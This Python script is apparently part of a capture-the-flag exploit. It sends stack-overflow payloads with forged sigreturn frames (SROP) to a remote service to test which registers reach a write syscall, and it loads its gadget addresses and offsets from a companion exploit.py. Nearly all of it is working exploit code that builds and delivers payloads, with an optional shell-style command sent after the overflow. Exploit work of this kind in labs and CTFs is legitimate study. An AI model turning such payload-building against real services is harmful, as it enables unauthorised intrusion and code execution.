#!/usr/bin/env python3
"""Are rdi/rsi/rdx/rax from the sigframe actually delivered?

reusing the program's own instruction sequence after sigreturn works (rip and rsp are
honoured), but a frame that supplies its own rax/rdi/rsi/rdx for a bare syscall at
0x401069 produces nothing at all.  Narrow it down by entering f1 *past* its own
register loads, so the syscall arguments can only come from the frame:

    0x401017  mov rsi,rsp; mov rdi,1; mov rdx,8; mov rax,1; syscall   (rsi = rsp)
    0x401021              mov rdx,8; mov rax,1; syscall        rsi,rdi from the frame
    0x401028                       mov rax,1; syscall     rdx,rsi,rdi from the frame
    0x401069                                syscall         everything from the frame

If 0x401028 prints the pattern the frame args land and only rax is in question; if
0x401021 prints it, rsi/rdi land too; the bare 0x401069 run pins rax.
"""
import socket
import struct
import time
import importlib.util

spec = importlib.util.spec_from_file_location("e", "exploit.py")
e = importlib.util.module_from_spec(spec)
spec.loader.exec_module(e)

PAT = b"PATPATTERN" * 4


def body(buf, rip, rdi, rsi, rdx, rax):
    b = bytearray(b"\x00" * (e.FRAME_AT + e.FRAME_LEN))
    b[0x20:0x20 + len(PAT)] = PAT
    struct.pack_into("<Q", b, e.OFF_G1, e.G1)
    struct.pack_into("<Q", b, e.OFF_SC, e.SC)
    struct.pack_into("<Q", b, e.OFF_BAIT, e.RESTART)
    for off, val in ((e.F_RIP, rip), (e.F_RSP, buf + e.OFF_BAIT),
                     (e.F_RAX, rax), (e.F_RDI, rdi), (e.F_RSI, rsi), (e.F_RDX, rdx),
                     (e.F_EFLAGS, 0x246), (e.F_SEL, 0x33 | (0x2B << 48))):
        struct.pack_into("<Q", b, e.FRAME_AT + off, val)
    return bytes(b)


def run(label, builder, also_send=None):
    s = socket.create_connection((e.HOST, e.PORT), timeout=25)
    try:
        L = struct.unpack("<Q", e.recvn(s, 8))[0]
        buf = (L - 0x80) & 0xFFFFFFFFFFFFFFFF
        s.sendall(b"\x90" * 24 + builder(buf))
        time.sleep(0.5)
        pre = e.drain(s, 0.3)
        s.sendall(b"Z" * 15)
        time.sleep(0.6)
        got = pre + e.drain(s, 2.0)
        note = ""
        if PAT[:8] in got:
            note = "  <== PATTERN FOUND"
        print("%-28s buf=%#x n=%-3d %-24s%s" % (label, buf, len(got), got[:24].hex(), note))
        if also_send:
            try:
                s.sendall(also_send.encode())
                time.sleep(0.8)
                print("      after a command: %r" % e.drain(s, 2.0)[:80])
            except OSError as ex:
                print("      command failed: %r" % ex)
    finally:
        s.close()
    time.sleep(0.5)


if __name__ == "__main__":
    run("0x401017 rsi=rsp, 8B", lambda b: body(b, 0x401017, 99, b + 0x20, 99, 99))
    run("0x401021 rsi/rdi from frame",
        lambda b: body(b, 0x401021, 1, b + 0x20, 99, 99))
    run("0x401028 rdx too", lambda b: body(b, 0x401028, 1, b + 0x20, 24, 99))
    run("0x401069 rax from frame", lambda b: body(b, e.SC, 1, b + 0x20, 24, 1))
